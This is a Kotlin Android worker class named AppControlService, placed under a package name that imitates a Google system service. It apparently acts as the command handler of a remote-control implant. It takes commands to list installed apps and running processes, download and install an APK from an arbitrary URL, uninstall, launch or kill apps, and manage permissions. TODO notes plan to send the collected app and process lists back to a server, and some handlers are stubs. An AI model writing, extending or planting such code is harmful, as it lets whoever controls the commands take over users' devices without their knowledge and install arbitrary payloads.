package com.google.android.systemservice.services

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import androidx.core.content.FileProvider
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.net.URL

@HiltWorker
class AppControlService @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters
) : CoroutineWorker(context, params) {
    
    private val packageManager = context.packageManager
    
    override suspend fun doWork(): Result {
        return try {
            val commandType = inputData.getString("command_type")
            when (commandType) {
                "list_installed_apps" -> handleListApps()
                "install_app" -> handleInstallApp()
                "uninstall_app" -> handleUninstallApp()
                "launch_app" -> handleLaunchApp()
                "kill_app" -> handleKillApp()
                "list_processes" -> handleListProcesses()
                "manage_permissions" -> handleManagePermissions()
                else -> Result.failure()
            }
        } catch (e: Exception) {
            Result.failure()
        }
    }
    
    private suspend fun handleListApps(): Result {
        val apps = listInstalledApps()
        // TODO: Send apps data back to server
        return Result.success()
    }
    
    private suspend fun handleInstallApp(): Result {
        val apkUrl = inputData.getString("apk_url") ?: return Result.failure()
        return installApp(apkUrl)
    }
    
    private suspend fun handleUninstallApp(): Result {
        val packageName = inputData.getString("package_name") ?: return Result.failure()
        return uninstallApp(packageName)
    }
    
    private suspend fun handleLaunchApp(): Result {
        val packageName = inputData.getString("package_name") ?: return Result.failure()
        return if (launchApp(packageName)) Result.success() else Result.failure()
    }
    
    private suspend fun handleKillApp(): Result {
        val packageName = inputData.getString("package_name") ?: return Result.failure()
        return if (killProcess(packageName)) Result.success() else Result.failure()
    }
    
    private suspend fun handleListProcesses(): Result {
        val processes = getRunningProcesses()
        // TODO: Send processes data back to server
        return Result.success()
    }
    
    private suspend fun handleManagePermissions(): Result {
        // TODO: Implement permission management
        return Result.success()
    }
    
    suspend fun listInstalledApps(): List<AppInfo> {
        return withContext(Dispatchers.IO) {
            packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
                .map { appInfo ->
                    val packageInfo = try {
                        packageManager.getPackageInfo(appInfo.packageName, 0)
                    } catch (e: Exception) {
                        null
                    }
                    
                    AppInfo(
                        packageName = appInfo.packageName,
                        appName = appInfo.loadLabel(packageManager).toString(),
                        versionName = packageInfo?.versionName ?: "Unknown",
                        versionCode = packageInfo?.longVersionCode ?: 0,
                        isSystemApp = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0,
                        installTime = packageInfo?.firstInstallTime ?: 0,
                        lastUpdateTime = packageInfo?.lastUpdateTime ?: 0
                    )
                }
        }
    }
    
    suspend fun installApp(apkUrl: String): Result {
        return withContext(Dispatchers.IO) {
            val apkFile = downloadApk(apkUrl)
            try {
                // Install APK (requires permissions)
                val intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(
                        FileProvider.getUriForFile(
                            applicationContext,
                            "${applicationContext.packageName}.fileprovider",
                            apkFile
                        ),
                        "application/vnd.android.package-archive"
                    )
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
                }
                applicationContext.startActivity(intent)
                
                Result.success()
            } catch (e: Exception) {
                Result.failure()
            } finally {
                apkFile.delete()
            }
        }
    }
    
    suspend fun uninstallApp(packageName: String): Result {
        return withContext(Dispatchers.IO) {
            try {
                val intent = Intent(Intent.ACTION_DELETE).apply {
                    data = Uri.parse("package:$packageName")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                applicationContext.startActivity(intent)
                
                Result.success()
            } catch (e: Exception) {
                Result.failure()
            }
        }
    }
    
    fun getRunningProcesses(): List<ProcessInfo> {
        val activityManager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager ?: return emptyList()
        return activityManager.runningAppProcesses?.map { process ->
            ProcessInfo(
                processName = process.processName,
                pid = process.pid,
                importance = process.importance
            )
        } ?: emptyList()
    }
    
    fun killProcess(packageName: String): Boolean {
        return try {
            val activityManager = applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager ?: return false
            activityManager.killBackgroundProcesses(packageName)
            true
        } catch (e: Exception) {
            false
        }
    }
    
    fun launchApp(packageName: String): Boolean {
        return try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            intent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                applicationContext.startActivity(it)
                true
            } ?: false
        } catch (e: Exception) {
            false
        }
    }
    
    private suspend fun downloadApk(url: String): File {
        return withContext(Dispatchers.IO) {
            val uniqueName = "download_${java.util.UUID.randomUUID()}.apk"
            val apkFile = File(applicationContext.cacheDir, uniqueName)
            URL(url).openStream().use { input ->
                apkFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }
            apkFile
        }
    }
}

data class AppInfo(
    val packageName: String,
    val appName: String,
    val versionName: String,
    val versionCode: Long,
    val isSystemApp: Boolean,
    val installTime: Long,
    val lastUpdateTime: Long
)

data class ProcessInfo(
    val processName: String,
    val pid: Int,
    val importance: Int
)
